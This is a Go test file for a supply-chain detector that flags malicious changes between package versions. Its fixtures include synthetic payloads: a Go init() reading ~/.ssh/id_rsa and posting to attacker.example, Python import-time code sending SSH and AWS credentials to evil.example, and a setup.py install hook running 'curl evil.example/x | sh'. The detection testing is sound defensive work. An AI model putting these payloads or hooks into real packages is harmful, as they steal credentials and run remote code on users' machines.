package source

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	"github.com/sarahmaeve/signatory/internal/signal"
	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// fakePinSource is a hand-built VersionPinSource for collector
// tests. Returns the table verbatim if err is nil, otherwise the
// configured error.
type fakePinSource struct {
	table PinTable
	err   error
}

func (f *fakePinSource) VersionPinTable(_ context.Context, _ *profile.Entity) (PinTable, error) {
	if f.err != nil {
		return PinTable{}, f.err
	}
	return f.table, nil
}

// versionFixture is one tagged version's file layout — used by
// initRepoWithVersionedProgression to build a multi-version git
// repo for the load-bearing integration test.
type versionFixture struct {
	Tag   string
	Files map[string]string
}

// initRepoWithVersionedProgression builds a git repo at a fresh
// tempdir, applying each fixture in order: clear the working
// tree (preserving .git), write the fixture's files, commit, and
// tag. Returns the clone path plus a tag → commit-SHA map for
// pin-table fixture construction.
//
// Each commit replaces the working tree wholesale — that's what
// "version progression" means here. The repo's tag history mirrors
// what proxy.golang.org would emit for a real Go module.
func initRepoWithVersionedProgression(t *testing.T, versions []versionFixture) (clonePath string, shaByTag map[string]string) {
	t.Helper()
	clonePath = t.TempDir()
	runGit(t, clonePath, "init", "-b", "main", "-q")
	runGit(t, clonePath, "config", "user.email", "test@example.invalid")
	runGit(t, clonePath, "config", "user.name", "Test")
	runGit(t, clonePath, "config", "commit.gpgsign", "false")
	runGit(t, clonePath, "config", "tag.gpgSign", "false")

	shaByTag = make(map[string]string, len(versions))

	for i, v := range versions {
		if i > 0 {
			clearWorkingTree(t, clonePath)
		}
		for path, content := range v.Files {
			writeFile(t, clonePath, path, content)
		}
		runGit(t, clonePath, "add", "-A")
		runGit(t, clonePath, "commit", "-m", "version "+v.Tag)
		runGit(t, clonePath, "tag", v.Tag)
		shaByTag[v.Tag] = captureGitOutput(t, clonePath, "rev-parse", "HEAD")
	}
	return clonePath, shaByTag
}

// clearWorkingTree removes every entry under clonePath except
// .git. Used between successive versions to simulate full-tree
// replacement (matches what `git checkout <tag>` would produce).
func clearWorkingTree(t *testing.T, clonePath string) {
	t.Helper()
	ents, err := os.ReadDir(clonePath)
	require.NoError(t, err)
	for _, ent := range ents {
		if ent.Name() == ".git" {
			continue
		}
		require.NoError(t, os.RemoveAll(filepath.Join(clonePath, ent.Name())))
	}
}

// goEntity returns a Go-ecosystem profile.Entity. Tests vary the
// CanonicalURI / Ecosystem to exercise different dispatch cases.
func goEntity(modulePath string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-" + modulePath,
		CanonicalURI: "pkg:golang/" + modulePath,
		Type:         profile.EntityPackage,
		Ecosystem:    "golang",
		ShortName:    modulePath,
	}
}

// pypiEntity returns a pypi-ecosystem profile.Entity. Source has
// already been resolved to a clone by the time the source-evolution
// collector runs, so only Ecosystem drives dispatch here.
func pypiEntity(pkg string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-pypi-" + pkg,
		CanonicalURI: "pkg:pypi/" + pkg,
		Type:         profile.EntityPackage,
		Ecosystem:    "pypi",
		ShortName:    pkg,
	}
}

// findEmittedSignal returns the first signal of the given type
// emitted in the result, or fails the test if not found.
func findEmittedSignal(t *testing.T, result *signal.CollectionResult, sigType string) profile.Signal {
	t.Helper()
	for _, s := range result.Signals() {
		if s.Type == sigType {
			return s
		}
	}
	t.Fatalf("signal %q not found in result; got %d signals", sigType, len(result.Signals()))
	return profile.Signal{}
}

// hasAbsenceForType reports whether the result holds an absence
// record of the form "absence:<sigType>".
func hasAbsenceForType(result *signal.CollectionResult, sigType string) bool {
	for _, s := range result.Signals() {
		if s.Type == "absence:"+sigType {
			return true
		}
	}
	return false
}

// ============================================================
// Skip / absence cases
// ============================================================

func TestCollector_NilEntity_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	result, err := c.Collect(context.Background(), nil)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

func TestCollector_NonGoEntity_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	npmEntity := &profile.Entity{
		ID:           "e-express",
		CanonicalURI: "pkg:npm/express",
		Type:         profile.EntityPackage,
		Ecosystem:    "npm",
	}
	result, err := c.Collect(context.Background(), npmEntity)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

func TestCollector_LegacyGoEcosystem_AlsoMatches(t *testing.T) {
	t.Parallel()
	// Pre-purl-canonicalization "go" ecosystem label still
	// triggers the collector. Without a pin source it falls
	// through to absence, but the dispatch fired.
	c := NewCollector("/tmp/some-clone", nil, false)
	entity := &profile.Entity{
		ID:           "ent-legacy",
		CanonicalURI: "pkg:go/example.com/legacy",
		Type:         profile.EntityPackage,
		Ecosystem:    "go",
	}
	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_NoPinSource_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", nil, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	assert.Equal(t, 0, result.SignalCount())
}

func TestCollector_PinTableNotAvailable_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: ErrPinTableNotAvailable}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_PinTableOtherError_FailuresBoth(t *testing.T) {
	t.Parallel()
	wantErr := errors.New("transient store boom")
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: wantErr}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	// Failures (retryable) tracked separately from plain absences.
	assert.NotEmpty(t, result.Failures, "transient pin-source error should produce a Failure record")
}

func TestCollector_NoClonePath_AbsencesBoth(t *testing.T) {
	t.Parallel()
	pinSource := &fakePinSource{table: PinTable{ModulePath: "example.com/foo"}}
	c := NewCollector("", pinSource, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

// ============================================================
// Load-bearing integration test
// ============================================================

// TestCollector_SyntheticProgression_MatrixSpikesAtV020 is the
// load-bearing test for the entire source-evolution stack. It
// exercises:
//
//  1. Real BlobStreamer against a real programmatic git repo
//  2. Real golang.Analyzer (AST parse + feature extraction)
//  3. Real Assembler (per-version + cross-version passes)
//  4. Real DetectAnomaly threshold logic
//  5. Real signal emission
//
// Stub VersionPinSource feeds in a hand-built pin table — that
// boundary is gopublish's responsibility, exercised by the
// gopublish unit + integration tests.
//
// The fixture mirrors the BufferZoneCorp grpc-client init payload
// pattern from the design doc: v0.1.0 has a clean Hello() function;
// v0.2.0 introduces an init() function that exercises every feature
// the analyzer counts (init + network + sensitive-path + exec +
// xor + base64). The matrix should reflect zeros at v0.1.0, full
// spike at v0.2.0; the anomaly should fire at v0.2.0 with all six
// features named.
//
// This test passing == the entire commit-7 pipeline working
// end-to-end on a payload matching the real-world threat that
// motivated the collector.
func TestCollector_SyntheticProgression_MatrixSpikesAtV020(t *testing.T) {
	t.Parallel()

	const cleanV010 = `package main

func Hello() string { return "hi" }
`
	const weaponizedV020 = `package main

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

var encodedURL = []byte{0x47, 0x71, 0x16, 0x35, 0x70, 0x47, 0x35, 0x6f}
var xorKey = []byte("grpcconn1")

func init() {
	for i := range encodedURL {
		encodedURL[i] ^= xorKey[i%len(xorKey)]
	}
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8gd29ybGQ=")
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	_, _ = http.Post("https://attacker.example/beacon", "application/octet-stream", nil)
	_ = exec.Command("sh", "-c", "echo pwned")
}

func Hello() string { return "hi" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": cleanV010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": weaponizedV020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/synth",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	entity := goEntity("example.com/synth")
	result, err := c.Collect(t.Context(), entity)
	require.NoError(t, err)
	require.Equal(t, 2, result.SignalCount(), "matrix + anomaly expected")
	require.Equal(t, 0, result.AbsenceCount(), "happy path produces no absences")

	// ---- matrix ----

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	assert.Equal(t, profile.SignalGroupPublication, matrixSig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, matrixSig.ForgeryResistance)
	assert.Equal(t, "source-evolution", matrixSig.Source)

	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Equal(t, "example.com/synth", matrix.ModulePath)
	require.Len(t, matrix.Rows, 2)

	// rows[0] = v0.2.0 (newest, weaponized)
	v020 := matrix.Rows[0]
	assert.Equal(t, "v0.2.0", v020.Version)
	assert.Equal(t, TagSHALocalPresent, v020.TagSHALocalStatus)
	require.NotNil(t, v020.AST)
	assert.Equal(t, 1, v020.AST.InitCount, "v0.2.0 has one init()")
	assert.GreaterOrEqual(t, v020.AST.NetworkCallSites, 1, "v0.2.0 has http.Post")
	assert.GreaterOrEqual(t, v020.AST.SensitivePathReads, 1, "v0.2.0 reads ~/.ssh/id_rsa via filepath.Join")
	assert.GreaterOrEqual(t, v020.AST.ExecCalls, 1, "v0.2.0 has exec.Command")
	assert.GreaterOrEqual(t, v020.AST.XORAssignments, 1, "v0.2.0 has ^= in decode loop")
	assert.GreaterOrEqual(t, v020.AST.Base64DecodeCalls, 1, "v0.2.0 has base64.StdEncoding.DecodeString")

	// rows[1] = v0.1.0 (oldest, clean)
	v010 := matrix.Rows[1]
	assert.Equal(t, "v0.1.0", v010.Version)
	assert.Equal(t, TagSHALocalPresent, v010.TagSHALocalStatus)
	require.NotNil(t, v010.AST)
	assert.Zero(t, v010.AST.InitCount)
	assert.Zero(t, v010.AST.NetworkCallSites)
	assert.Zero(t, v010.AST.SensitivePathReads)
	assert.Zero(t, v010.AST.ExecCalls)
	assert.Zero(t, v010.AST.XORAssignments)
	assert.Zero(t, v010.AST.Base64DecodeCalls)

	// Cross-version: v0.2.0 has DiffFromPrevious populated.
	require.NotNil(t, v020.DiffFromPrevious, "newer row should have diff vs older")
	assert.Greater(t, v020.DiffFromPrevious.LinesAdded, 0)
	// v0.1.0 (oldest) has no previous to diff against.
	assert.Nil(t, v010.DiffFromPrevious)

	// ---- anomaly ----

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	assert.Equal(t, profile.SignalGroupPublication, anomalySig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, anomalySig.ForgeryResistance)

	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "all six features cross zero — anomaly must fire")
	assert.Equal(t, "v0.2.0", anomaly.FirstAnomalousVersion)
	assert.Equal(t, "v0.1.0", anomaly.PreviousVersion)
	// All six features should be in SpikedFeatures (canonical
	// order from spikedFeatures helper).
	assert.Equal(t, []string{
		"init_count",
		"network_call_sites",
		"sensitive_path_reads",
		"exec_calls",
		"xor_assignments",
		"base64_decode_calls",
	}, anomaly.SpikedFeatures)
}

// TestCollector_CleanProgression_NoAnomaly is the negative
// counterpart of the load-bearing test: legitimate package
// growth (Hello() then add Goodbye()) should NOT fire the
// anomaly. Validates that the threshold doesn't false-positive on
// benign multi-version evolutions.
func TestCollector_CleanProgression_NoAnomaly(t *testing.T) {
	t.Parallel()

	const v010 = `package main

func Hello() string { return "hi" }
`
	const v020 = `package main

func Hello() string { return "hi" }
func Goodbye() string { return "bye" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": v010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": v020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/clean",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/clean"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "legitimate package growth should NOT fire anomaly")
}

// TestCollector_HappyPath_EmitsBothSignals verifies the basic
// emission contract: even a single-version pin table produces
// both signals (matrix has one row; anomaly is no-op since there's
// no previous version to compare against).
func TestCollector_HappyPath_EmitsBothSignals(t *testing.T) {
	t.Parallel()

	const single = `package main

func Hello() {}
`
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": single}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/single",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/single"))
	require.NoError(t, err)

	assert.Equal(t, 2, result.SignalCount())
	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Len(t, matrix.Rows, 1)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "single-version matrix can't have a spike")
}

// TestCollector_PyPIEntity_EmitsBothSignals is the load-bearing
// test for items #1+#2: a pypi entity must run the full
// source-evolution pipeline off the version_pin_table the pypi
// collector now emits. The collector must (a) not skip at the
// ecosystem gate, (b) stream .py via isPythonSourceFile (not .go),
// (c) use the Python placeholder analyzer so AST stays zero while
// structural + diff still populate.
func TestCollector_PyPIEntity_EmitsBothSignals(t *testing.T) {
	t.Parallel()

	const v1 = "def f():\n    return 1\n"
	const v2 = "def f():\n    return 1\n\n\ndef g():\n    return 2\n"
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"pkg/__init__.py": "VERSION = '1.0.0'\n",
			"pkg/core.py":     v1,
			// Decoys that must NOT be streamed: a .go file and a test.
			"pkg/test_core.py": "def test_f():\n    assert True\n",
			"setup.go":         "package x\n",
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"pkg/__init__.py": "VERSION = '1.1.0'\n",
			"pkg/core.py":     v2,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation"},
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	assert.Equal(t, 2, result.SignalCount(),
		"pypi entity must emit matrix + anomaly, not skip at the gate")

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)

	assert.Equal(t, "pypi", matrix.Ecosystem,
		"matrix must label a pypi entity as pypi, not the hardwired go")
	assert.Equal(t, "python", matrix.Language,
		"language must reflect the selected analyzer, not the hardwired go")

	for _, row := range matrix.Rows {
		require.NotNil(t, row.Structural, "structural pass must run for pypi (version %s)", row.Version)
		assert.Positive(t, row.Structural.LOC,
			"streamed .py LOC must be counted (version %s)", row.Version)
		if row.AST != nil {
			assert.Equal(t, astfeature.Counts{}, *row.AST,
				"Python analyzer is a placeholder — AST stays zero until roadmap #4")
		}
	}

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent,
		"AST-blind Python can't spike an AST feature; no anomaly expected")
}

// TestCollector_PyPIWeaponizedProgression_FiresAnomaly is the
// Python analog of TestCollector_SyntheticProgression: a clean
// v1.0.0 that only defines a function, then a v1.1.0 whose
// __init__.py gains the dominant real PyPI payload shape —
// exec(base64.b64decode(...)) plus network exfil running at import
// time. The matrix must show zeros at v1.0.0, a spike at v1.1.0, and
// the anomaly must fire naming the crossed features. This is the
// end-to-end proof that the hand-written Python lexer→parser→
// extractor feeds the existing anomaly detector correctly.
func TestCollector_PyPIWeaponizedProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanInit = "VERSION = '1.0.0'\n"
	const cleanCore = "import json\n\n\ndef parse(s):\n    return json.loads(s)\n"

	const weaponizedInit = "" +
		"import base64\n" +
		"import urllib.request\n" +
		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
		"urllib.request.urlopen('http://evil.example/' + 'exfil')\n" +
		"VERSION = '1.1.0'\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"pkg/__init__.py": cleanInit,
			"pkg/core.py":     cleanCore,
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"pkg/__init__.py": weaponizedInit,
			"pkg/core.py":     cleanCore,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)

	byVersion := map[string]MatrixRow{}
	for _, r := range matrix.Rows {
		byVersion[r.Version] = r
	}
	require.NotNil(t, byVersion["1.0.0"].AST)
	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
		"clean v1.0.0 must spike nothing")
	require.NotNil(t, byVersion["1.1.0"].AST)
	v2 := *byVersion["1.1.0"].AST
	assert.Positive(t, v2.DynamicEvalCalls, "exec() at import in v1.1.0")
	assert.Positive(t, v2.Base64DecodeCalls, "base64.b64decode in v1.1.0")
	assert.Positive(t, v2.NetworkCallSites, "urllib.request.urlopen in v1.1.0")
	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent,
		"a clean→weaponized Python progression must trip the anomaly")
	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
	assert.Subset(t, anomaly.SpikedFeatures,
		[]string{"dynamic_eval_calls", "base64_decode_calls", "network_call_sites", "import_time_call_sites"},
		"the crossed features must be named for the analyst")
}

// TestCollector_PyPICredentialStealerProgression_FiresAnomaly
// covers the dominant *modern* PyPI payload: a clean release, then a
// release whose __init__.py harvests SSH keys + cloud credentials
// and exfils them on import. sensitive_path_reads must be among the
// named spiked features.
func TestCollector_PyPICredentialStealerProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanInit = "VERSION = '2.0.0'\n"
	const cleanCore = "def configure(opts):\n    return dict(opts)\n"

	const stealerInit = "" +
		"import os\n" +
		"import urllib.request\n" +
		"_k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n" +
		"_a = open(os.path.expanduser('~/.aws/credentials')).read()\n" +
		"urllib.request.urlopen('http://evil.example/c2', data=_k.encode())\n" +
		"VERSION = '2.1.0'\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "2.0.0", Files: map[string]string{
			"pkg/__init__.py": cleanInit, "pkg/core.py": cleanCore,
		}},
		{Tag: "2.1.0", Files: map[string]string{
			"pkg/__init__.py": stealerInit, "pkg/core.py": cleanCore,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "2.0.0", SHA: shaByTag["2.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "2.1.0", SHA: shaByTag["2.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "credential-stealer release must trip the anomaly")
	assert.Equal(t, "2.1.0", anomaly.FirstAnomalousVersion)
	assert.Contains(t, anomaly.SpikedFeatures, "sensitive_path_reads",
		"the credential-read capability gain must be named for the analyst")
}

// TestCollector_PyPISetupHookProgression_FiresAnomaly covers the
// iconic install-time vector: a clean declarative setup.py, then a
// release that adds a setuptools install-command subclass running a
// shell payload at `pip install`. install_hook_overrides must be
// among the named spiked features.
func TestCollector_PyPISetupHookProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanSetup = "from setuptools import setup, find_packages\n" +
		"setup(name='demo', packages=find_packages())\n"
	const core = "def go():\n    return 1\n"

	const weaponizedSetup = "" +
		"from setuptools import setup\n" +
		"from setuptools.command.install import install\n" +
		"import os\n" +
		"class _Hook(install):\n" +
		"    def run(self):\n" +
		"        os.system('curl evil.example/x | sh')\n" +
		"        install.run(self)\n" +
		"setup(name='demo', cmdclass={'install': _Hook})\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "3.0.0", Files: map[string]string{"setup.py": cleanSetup, "demo/__init__.py": core}},
		{Tag: "3.1.0", Files: map[string]string{"setup.py": weaponizedSetup, "demo/__init__.py": core}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "3.0.0", SHA: shaByTag["3.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 1, 10, 0, 0, 0, 0, time.UTC)},
				{Version: "3.1.0", SHA: shaByTag["3.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "a setup.py install-hook gain must trip the anomaly")
	assert.Equal(t, "3.1.0", anomaly.FirstAnomalousVersion)
	assert.Contains(t, anomaly.SpikedFeatures, "install_hook_overrides",
		"the install-hook capability gain must be named for the analyst")
}

// TestCollector_Name_IsSourceEvolution pins the source-tracking
// string. Any rename here cascades into stored signal rows and
// dogfood-metrics aggregations.
func TestCollector_Name_IsSourceEvolution(t *testing.T) {
	t.Parallel()
	c := NewCollector("", nil, false)
	assert.Equal(t, "source-evolution", c.Name())
}
